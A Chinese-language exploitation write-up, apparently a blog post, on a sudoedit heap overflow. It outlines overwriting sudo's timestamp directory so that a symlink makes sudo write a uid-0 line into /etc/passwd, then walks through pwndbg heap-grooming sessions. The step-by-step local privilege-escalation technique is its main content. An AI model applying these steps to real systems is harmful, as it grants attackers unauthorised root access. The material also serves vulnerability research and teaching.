### 代码分析与漏洞利用思路

在 `plugins/sudoers/timestamp.c` 的第421行，我们可以看到，`sudo` 默认的时间戳文件路径是 `/run/sudo/ts` 加上当前用户名。`def_timestampdir` 是一个堆地址（在 `plugins/sudoers/defaults.c` 的第584行使用 `strdup` 初始化）。基于此，可以总结出以下漏洞利用思路：

1. **构造内存溢出**：通过溢出内存重写 `def_timestampdir` 的值，将其修改为普通用户可写的目录（记为 `NDIR`）。
2. **创建软链接**：启动另一个进程，在 `NDIR` 中创建一个指向 `/etc/passwd` 的软链接，名称为当前用户名。
3. **构造用户配置**：在同一块溢出内存中构造一个具有 `uid=0` 的当前用户配置（例如：`test: x:0:0::/home/test:/usr/bin/sh`）。
4. **利用 `timestamp_lock` 回写逻辑**：利用 `timestamp_lock` 函数的回写逻辑将新的配置写入 `NDIR/当前用户名`，最终实现 `test` 用户的 `uid` 变为 `0`。

这个漏洞利用方案类似于前几年的内核“脏牛”漏洞，都是通过越权修改文件来实现提权效果。根据 **Qualys** 团队的研究，`timestamp_lock` 的小漏洞已经在 2020 年 1 月的版本 586b418a 中修复，但尚未 backport 到老版本中。

### POC 实战

在上述三种方案中，我更倾向于第二种方案，原因如下：

- **无需对抗 ASLR**：有些操作系统不允许读取 crash 日志，获取 ASLR 基地址较为困难。
- **偏好缓存攻击**：个人更喜欢缓存攻击的攻击方案（以前工作中写过一些内核 POC，经常利用 slab/slub 机制。缓存设计的初衷是为了提升效率，结果却引发了新的安全问题，感兴趣的同学可以详细学习一下）。
- **依赖较少**：第三个方案依赖其他漏洞，前提条件太多，针对性太强。

综上所述，让我们开始第二种方案的实战。

#### 环境准备

首先，我们知道 `sudo` 的运行内存会受到 `LC_*` 环境变量的影响。我们先清空环境变量，查看 `sudo` 的运行内存情况：

```sh
# env -i HOME=/root PATH=/usr/bin/ gdb --args /tmp/sudo/bin/sudoedit -A -s xxxxxx\\ xxxxxxxxxxxxx
```

#### 内存状态分析

1. **set_cmnd 执行前的内存情况**：

    ```gdb
    pwndbg> heapbase
    heapbase : 0x55790ab92000
    pwndbg> heapinfo
    ...
    ```

2. **set_cmnd 执行后 nss_load_library 初始化 __nss_group_database 前的内存情况**：

    ```gdb
    pwndbg> heapinfo
    ...
    ```

3. **nss_load_library 初始化 __nss_group_database 和 sudo_user.cmnd_args 后的内存情况**：

    ```gdb
    pwndbg> heapinfo
    ...
    pwndbg> p __nss_group_database
    $5 = (service_user *) 0x55790ab92cc0
    pwndbg> p sudo_user.cmnd_args
    $6 = 0x55790ab9e390 "xxxxxx"
    pwndbg> chunkptr __nss_group_database
    ...
    pwndbg> chunkptr sudo_user.cmnd_args
    ...
    ```

从上述内存情况可以得出以下结论：

- `sudo_user.cmnd_args` 的地址高于 `__nss_group_database` 的地址。
- tcache 中没有低于 `__nss_group_database` 的地址。
- `__nss_group_database` 节点的大小是 `0x40`。
- `sudo_user.cmnd_args` 节点的大小是 `0x20`（因为已经溢出下一个 chunk 已被破坏）。

#### 构造内存碎片

接下来，我们构造一些内存碎片，使其地址小于 `__nss_group_database`：

```gdb
pwndbg> set env LC_IDENTIFICATION=en_US.UTF-8@xxxxxxxxxxxxx
pwndbg> heapbase
heapbase : 0x56447517a000
pwndbg> heapinfo
...
pwndbg> p __nss_group_database
$1 = (service_user *) 0x56447517d8c0
pwndbg> p sudo_user.cmnd_args
$2 = 0x564475187e40 "xxxxxx"
pwndbg> p (void*)__nss_group_database - 0x56447517d7e0
$2 = (void *) 0xe0
```

此时，我们发现 `tcache_entry[2]`、`tcache_entry[19]` 和 `tcache_entry[22]` 的内存碎片地址都小于 `__nss_passwd_database` 的地址。接下来我们调整输入参数，申请到这些碎片：

```gdb
pwndbg> b set_cmnd 
Breakpoint 1 at 0x7f36d5c62fd0: file ./sudoers.c, line 922.
pwndbg> r -s 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\'
...
pwndbg> heapbase
heapbase : 0x555f813c5000
pwndbg> heapinfo
...
pwndbg> b ./sudoers.c:1014
Breakpoint 2 at 0x7f053126319d: ./sudoers.c:1014. (2 locations)
pwndbg> c
...
pwndbg> heapinfo
...
pwndbg> b nss_load_library
Breakpoint 3 at 0x7f0531c8c4c0: file nsswitch.c, line 329.
pwndbg> c
...
pwndbg> p __nss_group_database
$1 = (service_user *) 0x555f813c88c0
pwndbg> p sudo_user.cmnd_args
$2 = 0x555f813c87d0 'x' 
pwndbg> p (void*)__nss_group_database - (void*)sudo_user.cmnd_args
$38 = 240
pwndbg> p (void*)&__nss_group_database->library - (void*)sudo_user.cmnd_args
$49 = 272
```

通过上述步骤，我们成功地构造了内存碎片，并使 `sudo_user.cmnd_args` 的地址低于 `__nss_group_database`，从而为后续的漏洞利用打下基础。